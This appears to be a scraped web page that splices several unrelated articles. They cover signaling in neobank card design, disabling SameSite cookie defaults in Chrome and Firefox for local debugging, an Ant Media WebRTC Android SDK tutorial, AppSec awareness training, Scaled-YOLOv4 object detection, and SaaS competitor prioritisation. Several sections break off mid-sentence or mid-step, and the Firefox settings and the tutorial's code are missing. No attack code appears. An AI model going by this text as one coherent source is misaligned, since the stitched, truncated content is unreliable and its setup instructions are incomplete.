<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Browser vendors like Mozilla or Google have introduced new default values for
the <code>sameSite</code> attribute when setting browser cookies [1]. While this change is
great for preventing third-party tracking through cookies, it can make a
developer’s life quite frustrating when wanting to debug a local front end
pointing to a remote server.</p>
<p>Especially, when Chrome and Firefox give confusing or no warnings at all. Here’s
an example of Chrome complaining:</p>
<p><img src="https://timdaub.github.io/assets/images/chrome_samesite.png" alt=""></p>
<p>In Firefox, there’ll likely be a small warning in the console:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>Some cookies are misusing the “SameSite“ attribute, so it won’t work as expected </span><br></pre></td></tr></tbody></table></figure>
<h2 id="The-Problem">The Problem</h2>
<p>For me the problem was the following: I had a staging server running online. It
contained sample data that I preferred using to test my front end over a local
backend server.</p>
<p>There’s a similar problem that developers run into with this type of setup:
CORS. I usually encounter it either when:</p>
<ul>
<li>I host front end and back end on different domains</li>
<li>I spin up a local front end development server and connect it to a backend
running online.</li>
</ul>
<p>That problem, I tend to prefer solving it by downloading a browser plugin that
temporarily disabled CORS. The recent <code>sameSite</code> cookie attribute change,
however, is different in that it’s recent. I only found limited information
about bypassing it online. There are no browser plugins yet either. Still, it
can be easily fixed by modifying some settings in your browser.</p>
<h2 id="Disabling-sameSite-policy-in-Google-Chrome">Disabling sameSite policy in Google Chrome</h2>
<ol>
<li>Navigate to <code>chrome://flags/#same-site-by-default-cookies</code>.</li>
<li>Set <em>“SameSite by default cookies”</em>, <em>“Enable removing SameSite=None
cookies”</em>, <em>“Cookies without SameSite must be secure”</em> to <code>Disabled</code>.</li>
<li><strong>Make sure to restart Chrome.</strong></li>
</ol>
<p>When trying your <code>Set-Cookie</code> request, the yellow overlay in the
request inspection tab should now be gone and your cookies should show up in
the “Application” tab.</p>
<h2 id="Disabling-sameSite-policy-in-Mozilla-Firefox-Developer-Edition">Disabling sameSite policy in Mozilla Firefox Developer Edition</h2>
<p>Go to <code>about:config</code> and make sure you have the following settings

<h2 id="Conclusion">Conclusion</h2>
<p>Issues with blocked <code>SameSite</code> cookies in local development environments can be

After the clicking<span>&nbsp;</span><code>Start Publishing</code>, stream will be published on Ant Media Server.<img src="https://camo.githubusercontent.com/6d9d0bcd74943dd614017572abe4adc3473a7f662120b65eacd0a6c953374116/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d7075626c6973682d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-publish-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 5" title="How to Use WebRTC SDK in Native Android App? 6"></li>
<li>Then it will start Publishing to your Ant Media Server. You can go to the web panel of Ant Media Server(http://server_ip:5080) and watch the stream there. You can also quickly play the stream via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/player.html</code></li>
</ul>
<h3>Play Stream from your Android</h3>
<ul>
<li>Firstly, you need to set<span>&nbsp;</span><code>webRTCMode</code><span>&nbsp;</span>parameter to<span>&nbsp;</span><code>IWebRTCClient.MODE_PLAY</code><span>&nbsp;</span>in<span>&nbsp;</span><code>MainActivity.java</code>.</li>
<li>Playing stream on your Android is almost the same as Publishing. Before playing, make sure that there is a stream that is already publishing to the server with same stream id in your<span>&nbsp;</span><code>streamId</code><span>&nbsp;</span>parameter (You can quickly publish to the Ant Media Server via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE</code>). For our sample, stream id is still “streamTest1” in the image below. Then you just need to tap<span>&nbsp;</span><code>Start Playing</code><span>&nbsp;</span>button.<img src="https://camo.githubusercontent.com/3139af3138ee8517e1a38f62b965d8a5241fe55124541cb3fc9c83b0d9dd1b07/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d706c61792d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-play-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 6" title="How to Use WebRTC SDK in Native Android App? 7"></li>
</ul>
<h3>P2P Communication with your Android</h3>
<p>WebRTC Android SDK also supports P2P communication. As you guess, just set<span>&nbsp;</span><code>webRTCMode</code><span>&nbsp;</span>parameter to<span>&nbsp;</span><code>IWebRTCClient.MODE_JOIN</code>.</p>
<p><img src="https://camo.githubusercontent.com/9c97ac306779d97ae8ebab468b870edead02eb9ebe30b9a9c30c37b47819ec4d/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d706565722d73637265656e2e6a7067" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-peer-screen.jpg" alt="How to Use WebRTC SDK in Native Android App? 7" title="How to Use WebRTC SDK in Native Android App? 8"><span></span></p>
<p>When there is another peer is connected to the same stream id via Android, iOS or Web, then P2P communication will be established and you can talk to each other. You can quickly connect to the same stream id via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/peer.html</code></p>
<h3>Join Conference Room with your Android</h3>
<p>WebRTC Android SDK also supports Conference Room feature. You just need to change the launcher activity to ConferenceActivity.java activity:</p>

<p>When there are other streams are connected to the same stream id via Android, iOS or Web, then Conference Room will be established and you can talk to each other. You can quickly connect to the same stream id via<span>&nbsp;</span><code>https://your_domain:5443/WebRTCAppEE/conference.html</code></p>
<p><img src="https://camo.githubusercontent.com/b5574b813482b403d21aa637190337bc227b2e436322f3f0937a87721f69252e/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323032302f30382f616e64726f69642d7765627274632d73646b2d636f6e666572656e63652d726f6f6d2e6a706567" width="360" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2020/08/android-webrtc-sdk-conference-room.jpeg" alt="How to Use WebRTC SDK in Native Android App? 9" title="How to Use WebRTC SDK in Native Android App? 10"><span></span></p>
<h2>Develop a WebRTC Android App</h2>
<p>We highly recommend using the sample project to get started your application. Nevertheless, it’s good to know the dependencies and how it works. So that we’re going to tell how to create a WebRTC Android app from Scratch. Let’s get started.</p>
<h3>Creating Android Project</h3>
<h5>Open Android Studio and Create a New Android Project</h5>
<p>Just Click<span>&nbsp;</span><strong><code>File &gt; New &gt; New Project</code></strong><span>&nbsp;</span>. Choose Empty Activity in the next window:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/setup_new_1.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 10" title="How to Use WebRTC SDK in Native Android App? 11"><span></span></p>
<p>Click Next button and a window should open as shown below for the project details. Fill the form:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/setup_new_2.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 11" title="How to Use WebRTC SDK in Native Android App? 12"><span></span></p>
<p>Click Finish and complete creating the project.</p>
<h5>Import WebRTC SDK as Module to Android Project</h5>
<p>After creating the project. Let’s import the WebRTC Android SDK to the project. For doing that click<span>&nbsp;</span><strong><code>File &gt; New &gt; Import Module</code></strong><span>&nbsp;</span>. Choose the directory of the WebRTC Android SDK and click the Finish button.<span>&nbsp;</span><img alt="Import Native WebRTC Android SDK" src="https://camo.githubusercontent.com/ee7c9c398a5c04df0ef0f8aec00e1780d18b94fa598f6d3cf20261e66aeafa2e/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323031382f30372f53637265656e2d53686f742d323031382d30372d32372d61742d30382e31312e34392e706e67" width="800px" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2018/07/Screen-Shot-2018-07-27-at-08.11.49.png" title="How to Use WebRTC SDK in Native Android App? 13"></p>
<p>If module is not included in the project, add the module name into<span>&nbsp;</span><code>settings.gradle</code><span>&nbsp;</span>file as shown in the image below.<span>&nbsp;</span><img alt="Import module in setting.gradle" src="https://camo.githubusercontent.com/30315512e927c0c9eb08443658913621936de87ba38756e629bad6d8414b2cf8/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323031382f30372f53637265656e2d53686f742d323031382d30372d32372d61742d30382e32302e32322d332e706e67" width="800px" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2018/07/Screen-Shot-2018-07-27-at-08.20.22-3.png" title="How to Use WebRTC SDK in Native Android App? 14"></p>
<h5>Add dependency to Android Project App Module</h5>
<p>Right-click<span>&nbsp;</span><code>app</code>, choose<span>&nbsp;</span><code>Open Module Settings</code>and click the<span>&nbsp;</span><code>Dependencies</code><span>&nbsp;</span>tab. Then a window should appear as below. Click the<span>&nbsp;</span><code>+</code><span>&nbsp;</span>button at the bottom and choose `Module Dependency“</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_module_dependency.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 12" title="How to Use WebRTC SDK in Native Android App? 15"><span></span></p>
<p>Choose WebRTC Native Android SDK and click OK button</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_choose_native_sdk.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 13" title="How to Use WebRTC SDK in Native Android App? 16"><span></span></p>
<p><strong>CRITICAL thing about that</strong><span>&nbsp;</span>You need import Module as an<span>&nbsp;</span><strong>API</strong><span>&nbsp;</span>as shown in the image above.It will look like as in the image below after adding the dependency:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_after_adding_native_sdk.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 14" title="How to Use WebRTC SDK in Native Android App? 17"><span></span></p>
<h5>Prepare the App for Streaming</h5>
<ul>
<li>Create a MainActivity.java Class and add a Button to your activity main layout. This is just simple Android App development, we don’t give details here. You can get lots of tutorials about that on the Internet.</li>
<li>Add permissions in Manifest file.</li>
</ul>
<p>Open the AndroidManifest.xml and add below permissions between<span>&nbsp;</span><code>application</code><span>&nbsp;</span>and<span>&nbsp;</span><code>manifest</code>tag</p>

<h5>Implement MainActivity onCreate function</h5>
<p>Open the MainActivity.java and implement it as below. You should change<span>&nbsp;</span><code>SERVER_URL</code><span>&nbsp;</span>according to your Ant Media Server address. Secondly, the third parameter in the last line of the code below is<span>&nbsp;</span><code>IWebRTCClient.MODE_PUBLISH</code><span>&nbsp;</span>that publishes the stream to the server. You can use<span>&nbsp;</span><code>IWebRTCClient.MODE_PLAY</code><span>&nbsp;</span>for playing stream and<span>&nbsp;</span><code>IWebRTCClient.MODE_JOIN</code><span>&nbsp;</span>for P2P communication. If token control is enabled, you should define<span>&nbsp;</span><code>tokenId</code><span>&nbsp;</span>parameter.</p>

<p>Last week I published a post introducing three important phases of AppSec Engineering: Awareness, Enablement, and Enforcement. Over the next three posts I will dive into each of these topics to share best practices and guidelines you can roll out to optimize your security engineering practice.</p>
<p>In my experience, the best AppSec programs start with AppSec awareness training. The goal is to provide your product team with enough information to know when they need security involvement. That’s a broad statement, so let’s break it down.</p>
<p>AppSec awareness is different than security awareness. General security awareness protects the organization or enterprise by training employees in topics such as how to identify phishing attacks, how to choose good passwords, and understanding why TLS is important. Security awareness is incredibly important to any organization as most successful data breaches include a human component. AppSec awareness, however, is more targeted and it arms your engineering team members on how to identify risk, understand vulnerabilities, and to recognize when the security team should be brought in to enable good decision making (more on that in phase 2).</p>
<p>It should be stated clearly that the goal of this program is not to turn every person in your organization into a security expert. It is to give them the tools they need to know when they are about to take an action that may impact business risk and to “raise their hand” for support and guidance.</p>
<blockquote>
<p>The goal of this program is <em>not</em> to turn every person at your organization into a security expert</p>
</blockquote>
<p>The goals during the awareness phase are to know:</p>
<ul>
<li>What needs to be protected</li>
<li>What are sensitive components</li>
<li>What is risk</li>
<li>Security can be interesting and fun</li>
<li>Security doesn’t have to be time consuming</li>
<li>The security team isn’t here just to say no</li>
</ul>
<p>Let’s break down each of the goals individually.</p>
<h2 id="what-needs-to-be-protected">What needs to be protected</h2>
<p>One of the first things I train a product team to do is to understand what assets are most important to protect. This can be Intellectual Property, regulated data (PII, PCI, HIPAA, etc.) , or what is most likely to be targeted by attackers. The ability to identify assets is a massive first step to understanding security, risk, and remediation.</p>
<h2 id="what-are-sensitive-components">What are sensitive components</h2>
<p>Components that handle sensitive data are inherently risky, but there are other components that can be difficult to build safely as well. Some components may give an attacker an advantage in the system, run as privileged accounts, or give access to other privileged data or components; these components should also be identified as risky as well.</p>
<h2 id="what-is-risk">What is risk</h2>
<p>Being able to have a meaningful conversation about risk is another key goal in the Awareness phase of AppSec Engineering. There are many ways to measure risk, many of them a complicated nesting doll of security jargon. However, I’ve found that most people inherently understand risk at a sufficient level for this awareness phase. AppSec professionals and leaders must understand risk deeply.</p>
<p><img src="https://rethinksecurity.io/post-images/risk.png" alt="Risk = Likelihood * Impact"></p>
<p>Defining risk as likelihood multiplied by impact is clear and understandable.</p>
<h2 id="security-can-be-interesting-and-fun">Security can be interesting and fun</h2>
<p>The best part of my job is watching the security “light-bulb” go off in people’s heads. Sometimes it’s when they understand how hackers think or sometimes it’s when they understand a specific threat or attack vector. No matter the precipitating event the discovery that security is fun and engaging is a key component of awareness. Making security fun will help the product security team return to security again and again and want to learn more about it organically.</p>
<h2 id="security-doesnt-have-to-be-time-consuming">Security doesn’t have to be time consuming</h2>
<p>When I started out in security, about 20 years ago, the focus was on “Security Gates” or checkpoints that the application would have to go through like a gauntlet of pain before deploying the product: Have you created a threat model? Did you do an architecture review? Have you performed the necessary code reviews, or code scans? Has the security team tested your system? Is there a review of the infrastructure impact and so many more things. Looking back it’s no wonder developers were cautious about security teams.</p>
<p>The current era of security focuses entirely on enablement&nbsp;The ProdSec team should be building libraries and tools that make development faster and easier for teams to build and deploy secure software. We will dive into the specifics of security enablement in the next article, but the key takeaway at this time is that the product team should understand working with security will not slow them down.</p>
<h2 id="the-security-team-isnt-here-just-to-say-no">The security team isn’t here just to say no</h2>
<p>Developers often think of the security team as unnecessarily obstructionist. With the security gates mentality this can absolutely be true. In fact security teams often get named “The office of no” and sometimes for good reason.</p>
<p>Many good security teams have evolved their thinking to enable development of great new features that are secure from current and future threats. Building software this way not only enables the development team to build software quickly and securely but also develops relationships between the teams and allows security to become a market differentiator for the product as a whole.</p>
<h2 id="what-is-the-security-implication-of-this">What is the security implication of this?</h2>
<p>If most of your Product Team is asking the question “What is the security implication of this?” during meetings, scrums, or feature discussions and that question spurs an engaging and lively discussion, then the goal of awareness has been achieved. The goal of this phase is to arm your team with the questions, passion, and curiosity to start these conversations, not necessarily to finish them.</p>
<h3 id="this-is-part-of-a-series-1">This is part of a series</h3>

In the computer vision landscape today there are many custom object detectors that recognize objects from farm animals to phone defects. </p><h3 id="the-coco-dataset">The COCO Dataset</h3><p><a href="https://blog.roboflow.com/coco-dataset/">The COCO dataset</a> is the gold standard benchmark for evaluating object detection models. The COCO (<a href="https://roboflow.com/formats/coco-json">Common Objects in COntext</a>) dataset contains over 120,000 images for training and testing, with 80 object class labels that are commonly observed in everyday life. Generally, if a model does well on the COCO dataset, it is believed that the model will generalize well to new custom domains - in the spirit of <a href="https://arxiv.org/abs/1612.08242">YOLO9000</a>, for 9000 objects.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-1.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-1.png 600w, https://blog.roboflow.com/content/images/2020/12/image-1.png 617w"><figcaption>Detecting the many objects in the world in <a href="https://arxiv.org/pdf/1612.08242.pdf">the original YOLO9000 model</a></figcaption></figure><h3 id="efficientdet-models-model-scaling">EfficientDet Models - Model Scaling</h3><p>The <a href="https://blog.roboflow.com/breaking-down-efficientdet/">EfficientDet</a> family of models has been the preferred object detection models since it was published by the Google Research/Brain team in recent months. The most novel contribution in the EfficientDet paper was to think strategically about how to scale object detection models up and down. </p><figure><img src="https://blog.roboflow.com/content/images/2020/12/model_scaling.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/model_scaling.png 600w, https://blog.roboflow.com/content/images/2020/12/model_scaling.png 688w"><figcaption>Model scaling in EfficientDet (<a href="https://arxiv.org/pdf/1911.09070.pdf">cite</a>)</figcaption></figure><p>Object detection models can be scaled by using a large image input resolution, scaling the width of the convolutional network layer, scaling the depth of convolutional layers, and scaling all of these things together. The EfficientDet authors use search to find an optimal scaling threshold from EfficientDet-D0 to EfficientDet-D1, and use this setting to linearly scale up to the famed EfficientDet-D7.</p><h3 id="yolo-models">YOLO Models</h3><p>The YOLO family of models, written in the Darknet framework, has a <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">rich history</a> starting with Joseph Redmon (Github moniker <a href="https://pjreddie.com/">pjreddie</a>). Recently, the YOLO name and architecture have been picked up recently by a number of computer vision researchers.</p><p><strong>YOLOv4 - </strong>Early this spring, <a href="https://github.com/AlexeyAB">AlexyAB</a> formalized his fork of the Darknet repo, publishing the state-of-the-art <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">YOLOv4 model</a>. YOLOv4 was considered one of the best models for speed and accuracy performance, but did not top EfficientDet's largest model for overall accuracy on the COCO dataset.</p><p><strong>YOLOv5 - </strong>Shortly after the release of YOLOv4, Glenn Jocher (Github moniker <a href="https://github.com/glenn-jocher">glenn-jocher</a>) published his version of the YOLO model in PyTorch as <a href="https://blog.roboflow.com/yolov5-improvements-and-evaluation/">YOLOv5</a>. Comparing how YOLOv4 and YOLOv5 models stacked up against each other was nuanced – we wrote a bunch on the <a href="https://blog.roboflow.com/yolov4-versus-yolov5/"></a><a href="https://blog.roboflow.com/yolov4-versus-yolov5/">YOLOv4 vs</a>.<a href="https://blog.roboflow.com/yolov4-versus-yolov5/"> YOLOv5 </a>debate here.</p><p>The YOLOv5 PyTorch training and architecture conversion was the most notable contribution, making YOLO easier than ever to train, <em>speeding up training time 10x relative to Darknet</em>. </p><p>One of the main reasons Scaled-YOLOv4 is implemented in the YOLOv5 PyTorch framework is, no doubt, the training routines. Glenn Jocher notably gets a shoutout in the Acknowledgments of Scaled-YOLOv4.</p><p><strong>PP-YOLO - </strong>This summer, researchers at <a href="https://www.baidu.com/">Baidu</a> released their version of the YOLO architecture, <a href="https://blog.roboflow.com/pp-yolo-beats-yolov4-object-detection/">PP-YOLO, surpassing YOLOv4 and YOLOv5</a>. The network, written in <a href="https://www.paddlepaddle.org.cn/">the Paddle-Paddle framework</a>, performed well but has yet to gain much traction among practitioners.</p><p><strong>But all of that's old news:</strong> Scaled-YOLOv4 is here and YOLOv4 has been fully <a href="https://arxiv.org/pdf/1911.11929.pdf">CSP-ized</a>!</p><h2 id="scaled-yolov4-techniques">Scaled-YOLOv4 Techniques</h2><p>To scale the YOLOv4 model, the Scaled-YOLOv4 authors explore the following strategies.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-3.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-3.png 600w, https://blog.roboflow.com/content/images/size/w1000/2020/12/image-3.png 1000w, https://blog.roboflow.com/content/images/2020/12/image-3.png 1376w" sizes="(min-width: 720px) 720px"><figcaption>A visualization of the YOLO network, courtesy of <a href="https://arxiv.org/pdf/2007.12099.pdf">PP-YOLO</a>.

They consider a few CSP-ized CNN backbones in their network, ResNet, ResNeXt, and the traditional Darknet backbone.</p><h3 id="csp-izing">"CSP-izing"</h3><p>In the <a href="https://arxiv.org/abs/2011.08036">Scaled-YOLOv4</a> paper the authors often write that they "CSP-ized" a given portion of the network. To CSP-ize means to apply the concepts laid out in the <a href="https://arxiv.org/pdf/1911.11929">Cross-Stage Partial Networks</a> paper, written by <a href="https://github.com/WongKinYiu">WongKinYiu</a>. The CSP is a new way to architect convolutional neural networks that saves on computation for various CNN networks - up to 50% (for the Darknet backbone in FLOPs).</p><h3 id="scaling-the-yolov4-tiny-model">Scaling the YOLOv4-tiny model</h3><p>The YOLOv4-tiny model had different considerations than the Scaled-YOLOv4 model because, on the edge, different constraints come into play, like memory bandwidth and memory access. For the YOLOv4-tiny's shallow CNN, the authors look to <a href="https://arxiv.org/pdf/2011.08036.pdf">OSANet</a> for its favorable computational complexity at little depth.</p><h3 id="scaling-the-yolov4-csp-models">Scaling the YOLOv4-CSP models </h3><p>To detect large objects in large images, the authors find that it is important to increase the depth and number of stages in in the CNN backbone and neck. (Increasing the width reportedly has little effect.) This allows them to first scale up input size and number of stages, and dynamically adjust width and depth according to realtime inference speed requirements. In addition to these scaling factors, the authors also adjust the configuration of their model's architecture in the paper.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-2.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-2.png 600w, https://blog.roboflow.com/content/images/2020/12/image-2.png 695w"><figcaption>YOLOv4-P5/P6/P7 architectures (<a href="https://arxiv.org/pdf/2011.08036.pdf">cite</a>)</figcaption></figure><h3 id="data-augmentations">Data Augmentations</h3><p><a href="https://towardsdatascience.com/data-augmentation-in-yolov4-c16bd22b2617">Data augmentation in YOLOv4</a> was one of the key contributions to YOLOv4's impressive performance. In Scaled-YOLOv4, the authors train on a less augmented dataset first, then turn up the augmentations for fine-tuning at the end of training. They also use "Test Time Augmentations," where a number of augmentations are made on the test set. Predictions are then averaged across those test augmentations to further boost their non-real time results. &nbsp;</p><h2 id="scaled-yolov4-results">Scaled-YOLOv4 Results</h2><p>Evaluations show that the Scaled-YOLOv4 models set the standard for both large and small object detection models.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image.png 600w, https://blog.roboflow.com/content/images/2020/12/image.png 650w"><figcaption>Scaled-YOLOv4 results, inference speed on the X-axis and COCO average precision on the Y-axis (<a href="https://arxiv.org/pdf/2011.08036.pdf">cite</a>)</figcaption></figure><p>The language in the Scaled-YOLOv4 paper speaks for itself:</p><blockquote>We can see that all scaled YOLOv4 models, including YOLOv4-CSP, YOLOv4-P5, YOLOv4-P6, YOLOv4- P7, are Pareto optimal on all indicators. When we compare YOLOv4-CSP with the same accuracy of EfficientDetD3 (47.5% vs 47.5%), the inference speed is 1.9 times [that of EfficientDetD3]. When YOLOv4-P5 is compared with EfficientDet-D5 with the same accuracy (51.4% vs 51.5%), the inference speed is 2.9 times [that of EfficientDet-D5]. The situation is similar to the comparisons between YOLOv4-P6 vs EfficientDet-D7 (54.3% vs 53.7%) and YOLOv4-P7 vs EfficientDet-D7x (55.4% vs 55.1%). In both cases, YOLOv4-P6 and YOLOv4-P7 are, respectively, 3.7 times and 2.3 times faster in terms of inference speed. </blockquote><p>And notably for YOLOv4-tiny:</p><blockquote>In addition, if one uses TensorRT FP16 to run YOLOv4-tiny on general GPU RTX 2080ti, when the batch size respectively equals to 1 and 4, the respective frame rate can reach 773fps and 1774fps, which is extremely fast.</blockquote><p><strong>If you want to push the ceiling for performance or speed for your object detection task, Scaled-YOLOv4 is the new place to look.</strong></p><p>The authors provide myriad ablation studies and many more research insights than we have written here.

December 3, 2020 | https://staysaasy.com/product/2020/12/01/which-competitors-matter.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/product/2020/12/01/which-competitors-matter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Enterprise SaaS is brutally competitive. Markets are crowded and zero sum: customers are buying your product, a competing product, or nothing. The industry naturally leads teams to obsess about competitors.</p>

<p>If you spend your entire day thinking about the competition, you’ll fail. The best companies succeed by building what their customers need, rather than analyzing their competitors’ actions. To stay focused (and stay sane), you need to relentlessly prioritize and only devote your team’s finite energy to your most significant rivals.</p>

<p>It’s a bit like running a football team. If you spend your entire time studying your opponents, you’ll lose because you didn’t practice your plays, work out, or prepare to play your game. But if you ignore your opponents and focus 100% inwardly, you’ll both miss out on opportunities to beat them and also risk having your weaknesses exploited. And unlike in football, you may have dozens or hundreds of opposing teams, and you don’t even know who your next opponent might be.</p>

<p>Inevitably, you need to decide which competitors deserve your attention. Taking the right steps to ward off serious competitors pays dividends when done early. Beat an established company enough and you can dissuade them from entering your market. Kill your startup competitors in the crib, and they’ll pivot or be unable to raise funds to survive.</p>

<p>Below is a quick-and-dirty set of criteria to determine how much mind to pay your competitors, in order from least worrisome to most.</p>

<h2 id="you-run-into-a-competitor-in-new-head-to-head-deals-but-you-always-win">You run into a competitor in new head-to-head deals, but you always win</h2>

<p><em>We’ve seen a new competitor, SnowDog, in 3 deals already. But don’t worry, we’ve beaten them every time. Their product is just not able to compete with ours at this point.</em></p>

<p>Running into a competitor in head-to-head deals is the first indication that they’re coming for your market. It means that their sales and marketing can access the same customers as you, and that their product positioning attracts the same buyers.</p>

<p>At this stage, if you’re consistently beating a competitor, one of two things can happen. In some cases, they’ll give up – pivoting or abandoning their product, or steering away from you in the market. But in others, this stage is just the precursor and they’ll persist in their efforts to compete. This is the first warning sign but is usually not worth reacting to.</p>

